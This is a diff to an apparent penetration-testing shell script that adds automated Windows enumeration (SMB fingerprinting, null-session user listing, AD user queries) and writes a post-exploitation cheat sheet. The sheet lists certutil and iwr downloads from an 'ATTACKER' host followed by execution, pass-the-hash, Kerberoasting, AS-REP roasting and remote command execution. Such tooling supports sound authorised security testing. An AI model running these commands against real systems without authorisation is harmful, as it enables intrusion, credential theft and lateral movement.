@@ -801,5 +801,146 @@ linux_enum() {
 }
 
 windows_enum() {
-    echo -e "${YELLOW}[+] Work in progress - Windows enumeration not yet implemented${NO_COLOR}"
+    local timeout="${1:-300}"
+    local dry_run="${2:-}"
+
+    if [[ "$dry_run" == "--dry-run" ]]; then
+        echo -e "${YELLOW}[+] Would run windows_enum on $IP${NO_COLOR}"
+        return 0
+    fi
+
+    echo -e "${GREEN}[+] Starting Windows enumeration...${NO_COLOR}"
+    mkdir -p "$loot/windows"
+
+    # === Validate: require >= 2 common Windows ports OR confirmed tag from OS_guess/_tag_os_from_scan ===
+    local win_ports=(135 139 445 3389 5985 5986 593 88)
+    local win_port_count=0
+    local svc_file
+    for svc_file in \
+        "$IP/autoenum/reg_scan/ports_and_services/services_running" \
+        "$IP/autoenum/aggr_scan/ports_and_services/services_running" \
+        "$IP/autoenum/top_1k/ports_and_services/services" \
+        "$IP/autoenum/top_10k/ports_and_services/services"; do
+        [[ ! -s "$svc_file" ]] && continue
+        for port in "${win_ports[@]}"; do
+            if grep -q "^${port}/" "$svc_file" 2>/dev/null; then
+                win_port_count=$(( win_port_count + 1 ))
+            fi
+        done
+        break  # use first available scan results file
+    done
+
+    local windows_confirmed=0
+    [[ -s "$loot/raw/windows_found" ]] && windows_confirmed=1
+
+    if (( win_port_count < 2 )) && (( windows_confirmed == 0 )); then
+        echo -e "${YELLOW}[-] Windows not confirmed — fewer than 2 Windows ports detected and no OS tag set.${NO_COLOR}"
+        echo -e "${YELLOW}[-] Skipping windows_enum. Common Windows ports: 135, 139, 445, 3389, 5985${NO_COLOR}"
+        return 0
+    fi
+    echo -e "${GREEN}[+] Windows target confirmed (${win_port_count} matching ports)${NO_COLOR}"
+
+    # === nxc SMB fingerprint ===
+    (
+        echo -e "${YELLOW}[+] Running nxc SMB fingerprint${NO_COLOR}"
+        timeout "$timeout" nxc smb "$IP" 2>/dev/null \
+            | tee "$loot/windows/nxc_smb" 2>/dev/null || {
+            echo -e "${RED}[-] nxc smb failed${NO_COLOR}"
+        }
+        echo "nxc smb $IP" >> "$loot/windows/cmds_run"
+    ) &
+
+    # === nmap Windows SMB/RPC fingerprint scripts ===
+    (
+        echo -e "${YELLOW}[+] Running nmap Windows fingerprint scripts${NO_COLOR}"
+        timeout "$timeout" nmap -p 135,139,445 -sV \
+            --script "smb-os-discovery,smb-security-mode,smb2-security-mode,msrpc-enum" \
+            "$IP" | tee "$loot/windows/nmap_win_scripts" 2>/dev/null || {
+            echo -e "${RED}[-] nmap Windows scripts failed${NO_COLOR}"
+        }
+        echo "nmap -p 135,139,445 -sV --script smb-os-discovery,smb-security-mode,smb2-security-mode,msrpc-enum $IP" >> "$loot/windows/cmds_run"
+    ) &
+
+    # === enum4linux-ng full null-session recon ===
+    (
+        echo -e "${YELLOW}[+] Running enum4linux-ng${NO_COLOR}"
+        timeout "$timeout" enum4linux-ng -A "$IP" 2>/dev/null \
+            | tee "$loot/windows/enum4linux_ng" 2>/dev/null || {
+            echo -e "${RED}[-] enum4linux-ng failed${NO_COLOR}"
+        }
+        echo "enum4linux-ng -A $IP" >> "$loot/windows/cmds_run"
+    ) &
+
+    # === rpcclient null session user enumeration ===
+    (
+        echo -e "${YELLOW}[+] Attempting rpcclient null session${NO_COLOR}"
+        timeout 30 rpcclient -U "" -N "$IP" -c "enumdomusers" 2>/dev/null \
+            | tee "$loot/windows/rpcclient_users" 2>/dev/null || {
+            echo -e "${YELLOW}[-] rpcclient null session failed (expected on hardened targets)${NO_COLOR}"
+        }
+        echo "rpcclient -U '' -N $IP -c 'enumdomusers'" >> "$loot/windows/cmds_run"
+    ) &
+
+    wait
+
+    # === impacket GetADUsers if ldap_enum already found a base DN ===
+    if [[ -s "$loot/ldap/ldapsearch_base.txt" ]]; then
+        local base_dn
+        base_dn=$(awk '/namingcontexts/ {print $2}' "$loot/ldap/ldapsearch_base.txt" | head -1)
+        if [[ -n "$base_dn" ]]; then
+            echo -e "${YELLOW}[+] LDAP base DN available ($base_dn) — trying impacket-GetADUsers (unauthenticated)${NO_COLOR}"
+            timeout "$timeout" impacket-GetADUsers -all -dc-ip "$IP" "$base_dn" 2>/dev/null \
+                | tee "$loot/windows/ad_users" 2>/dev/null || {
+                echo -e "${YELLOW}[-] impacket-GetADUsers failed (may require credentials)${NO_COLOR}"
+            }
+            echo "impacket-GetADUsers -all -dc-ip $IP $base_dn" >> "$loot/windows/cmds_run"
+        fi
+    fi
+
+    # === Clean up empty output files ===
+    find "$loot/windows" -type f ! -name "cmds_run" -empty -delete 2>/dev/null
+
+    # === Post-exploitation manual commands stub ===
+    cat > "$loot/windows/post_exploitation_cmds" << 'EOF'
+# ===== POST-EXPLOITATION: Windows =====
+# Run these once you have initial access
+
+# --- Privilege Escalation ---
+# WinPEAS (upload and run):
+#   certutil -urlcache -f http://ATTACKER/winPEAS.exe C:\Temp\winPEAS.exe && C:\Temp\winPEAS.exe
+# Seatbelt:
+#   Seatbelt.exe -group=all
+# PowerUp:
+#   Import-Module PowerUp.ps1; Invoke-AllChecks
+
+# --- AD Enumeration (with creds) ---
+# BloodHound:
+#   SharpHound.exe --CollectionMethods All --ZipFileName bh_out.zip
+#   bloodhound-python -c All -u USER -p PASS -d DOMAIN -dc DC_IP
+# PowerView:
+#   Get-NetUser | select samaccountname, description
+#   Get-NetGroup "Domain Admins" | select member
+#   Find-LocalAdminAccess
+#   Invoke-ShareFinder
+# NetExec with creds:
+#   nxc smb SUBNET/24 -u USER -p PASS --shares
+#   nxc smb IP -u USER -p PASS -x "whoami"
+#   nxc winrm IP -u USER -p PASS
+
+# --- File Transfer ---
+#   certutil -urlcache -split -f http://ATTACKER/file.exe C:\Temp\file.exe
+#   iwr http://ATTACKER/file.ps1 -OutFile C:\Temp\file.ps1
+#   python3 -m http.server 80   # attacker side
+
+# --- Pass-The-Hash / Tickets ---
+#   impacket-psexec DOMAIN/USER@IP -hashes :HASH
+#   impacket-wmiexec DOMAIN/USER:PASS@IP
+#   impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip IP    # AS-REP roast
+#   impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP -request       # Kerberoast
+EOF
+
+    rm -f "$loot/raw/windows_found"
+    echo -e "${GREEN}[+] Windows enumeration complete!${NO_COLOR}"
+    echo -e "${CYAN}[+] Results saved to: $loot/windows/${NO_COLOR}"
+    echo -e "${CYAN}[+] Post-exploitation commands: $loot/windows/post_exploitation_cmds${NO_COLOR}"
 }
